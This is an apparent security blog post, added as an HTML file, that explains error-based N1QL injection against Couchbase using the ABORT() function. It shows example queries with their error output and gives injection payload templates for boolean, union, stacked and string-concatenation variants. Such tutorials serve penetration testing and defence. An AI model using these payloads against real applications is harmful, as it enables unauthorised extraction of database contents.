@@ -1,0 +1,177 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>N1QL Injection - Part 4 // FelSec - Blog</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.154.3">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="FelSec" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://felsec.com/css/main.min.f6361b42d404a23cafcf1b9a8cab08905c6731c6a4a64ef829e96f416baf2537.css" />
+    <link rel="stylesheet" href="/css/code.css" />
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="N1QL Injection - Part 4">
+  <meta name="twitter:description" content="ABORT! ABORT! ABORT! Error-based N1QL injection.">
+
+    <meta property="og:url" content="https://felsec.com/posts/n1qlinjection-part4/">
+  <meta property="og:site_name" content="FelSec - Blog">
+  <meta property="og:title" content="N1QL Injection - Part 4">
+  <meta property="og:description" content="ABORT! ABORT! ABORT! Error-based N1QL injection.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-14T20:35:10+01:00">
+    <meta property="article:modified_time" content="2026-01-14T20:35:10+01:00">
+    <meta property="article:tag" content="Injection">
+    <meta property="article:tag" content="Couchbase">
+    <meta property="article:tag" content="N1QL">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://felsec.com/"><img class="app-header-avatar" src="/avatar.png" alt="FelSec" /></a>
+      <h1>FelSec - Blog</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">Posts</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Penetration Tester &amp; Security Researcher</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/felsec" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://bsky.app/profile/felsec.bsky.social" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">N1QL Injection - Part 4</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 14, 2026
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://felsec.com/tags/injection/">Injection</a>
+              <a class="tag" href="https://felsec.com/tags/couchbase/">Couchbase</a>
+              <a class="tag" href="https://felsec.com/tags/n1ql/">N1QL</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="abort-abort-abort-error-based-n1ql-injection">ABORT! ABORT! ABORT! Error-Based N1QL Injection</h1>
+<p>Since version 7.0 Couchbase have added the very useful <code>ABORT()</code> function that allows for error-based N1QL injection. In this post we will dig into what the function does and how we as attackers can use it for fun and profit.</p>
+<h2 id="the-abort-function">The ABORT Function</h2>
+<p>Put simply the <code>ABORT()</code> function generates an error.</p>
+<p>The exact error generated by the function depends on where it is used, but in all cases it returns an error message that contains the text specified by the expression passed to the function.</p>
+<p>For example - the query <code>SELECT ABORT(&quot;Oh no! Anyway...&quot;);</code>, would return the following result:</p>
+<pre tabindex="0"><code>[
+  {
+    &#34;code&#34;: 5011,
+    &#34;msg&#34;: &#34;Abort: \&#34;Oh no! Anyway...\&#34;. - cause: \&#34;Oh no! Anyway...\&#34;&#34;
+  }
+]
+</code></pre><p>The function is intended to be used for flow control within inline user-defined functions, ideally to return a useful error message when something has gone wrong.</p>
+<h2 id="using-it-for-fun-and-profit">Using It For Fun And Profit</h2>
+<p>Before we have a look at how this function makes exploiting N1QL injection vulnerabilities incredibly easy, there is one very minor thing that needs to be in place.</p>
+<p>The target application <strong>MUST</strong> return the error messages!</p>
+<p>If the application returns and Internal Server Error, or actually handles the error correctly then this method of injection cannot be used. That&rsquo;s not to say the <code>ABORT()</code> function cannot be used to attack the server in other ways but it cannot be used to extract data from the Couchbase instance.</p>
+<p>With that minor thing out of the way we can now move on to how we can use the function to our advantage.</p>
+<h3 id="basic-usage">Basic Usage</h3>
+<p>As defined in the documentation, the <code>ABORT()</code> function returns the text specified by the expression passed to the function. This means that we can pass in valid N1QL queries, which will then get executed and the result returned within the error message. More interestingly the value being returned does not need to be a valid string, the function is able to return JSON objects, arrays, numbers, basically anything that can be returned by a N1QL query.</p>
+<p>Note: The <code>ABORT()</code> function and any included queries are executed with the permissions of the current user.</p>
+<p>This means that all of the following function calls are valid and will return their respective data.</p>
+<ul>
+<li><code>SELECT ABORT(1)</code></li>
+</ul>
+<pre tabindex="0"><code>[
+  {
+    &#34;code&#34;: 5011,
+    &#34;msg&#34;: &#34;Abort: 1. - cause: 1&#34;
+  }
+]
+</code></pre><ul>
+<li><code>SELECT ABORT(null)</code></li>
+</ul>
+<pre tabindex="0"><code>[
+  {
+    &#34;code&#34;: 5011,
+    &#34;msg&#34;: &#34;Abort: null. - cause: null&#34;
+  }
+]
+</code></pre><ul>
+<li><code>SELECT ABORT((SELECT * FROM system:namespaces))</code></li>
+</ul>
+<pre tabindex="0"><code>[
+  {
+    &#34;code&#34;: 5011,
+    &#34;msg&#34;: &#34;Abort: [{\&#34;namespaces\&#34;:{\&#34;datastore_id\&#34;:\&#34;http://127.0.0.1:8091\&#34;,\&#34;id\&#34;:\&#34;default\&#34;,\&#34;name\&#34;:\&#34;default\&#34;}}]. - cause: [{\&#34;namespaces\&#34;:{\&#34;datastore_id\&#34;:\&#34;http://127.0.0.1:8091\&#34;,\&#34;id\&#34;:\&#34;default\&#34;,\&#34;name\&#34;:\&#34;default\&#34;}}]&#34;
+  }
+]
+</code></pre><ul>
+<li><code>SELECT ABORT(TOSTRING(BASE64_DECODE('f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAEDgDAAAAAAA=')))</code></li>
+</ul>
+<pre tabindex="0"><code>[
+  {
+    &#34;code&#34;: 5011,
+    &#34;msg&#34;: &#34;Abort: ELF\u0002\u0001\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0000&gt;\u0000\u0001\u0000\u0000\u0000\u00108\u0003\u0000\u0000\u0000\u0000\u0000. - cause: ELF\u0002\u0001\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0000&gt;\u0000\u0001\u0000\u0000\u0000\u00108\u0003\u0000\u0000\u0000\u0000\u0000&#34;
+  }
+]
+</code></pre><h3 id="using-it-as-part-of-an-injection-payload">Using It As Part Of An Injection Payload</h3>
+<p>So, how do we use it within our injection payloads? Simple, replace our usual conditional statements or select statements with it as shown below.</p>
+<h4 id="boolean">Boolean</h4>
+<pre tabindex="0"><code>SELECT &#39;felsec&#39; WHERE &#39;vulnerable&#39;=&#39;vulnerable&#39; AND ABORT(&lt;expression&gt;)--
+
+SELECT &#39;felsec&#39; WHERE &#39;vulnerable&#39;=&#39;notvulnerable&#39; OR ABORT(&lt;expression&gt;)--
+</code></pre><h4 id="union">Union</h4>
+<pre tabindex="0"><code>SELECT &#39;felsec&#39; WHERE &#39;vulnerable&#39;=&#39;notvulnerable&#39; UNION SELECT ABORT(&lt;expression&gt;)--
+</code></pre><h4 id="stacked">Stacked</h4>
+<pre tabindex="0"><code>SELECT &#39;felsec&#39;,(SELECT ABORT(&lt;expression&gt;))--
+
+SELECT (SELECT * FROM `beer-sample` WHERE &#39;a&#39;=&#39;a&#39;),ABORT(&lt;expression&gt;)--
+</code></pre><h4 id="string-concatenation">String Concatenation</h4>
+<pre tabindex="0"><code>SELECT &#39;felsec&#39; WHERE &#39;vulnerable&#39;=&#39;vulnerable&#39;||CASE WHEN ABORT(&lt;expresion&gt;) THEN &#39;&#39; ELSE &#39;1&#39; END
+</code></pre><h2 id="closing-thoughts">Closing Thoughts</h2>
+<p>The <code>ABORT()</code> function makes Error-based N1QL injection a very powerful method for extracting data from the database, particularly in situations where error messages are returned and the only alternative method is Boolean-based or string concatenation.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
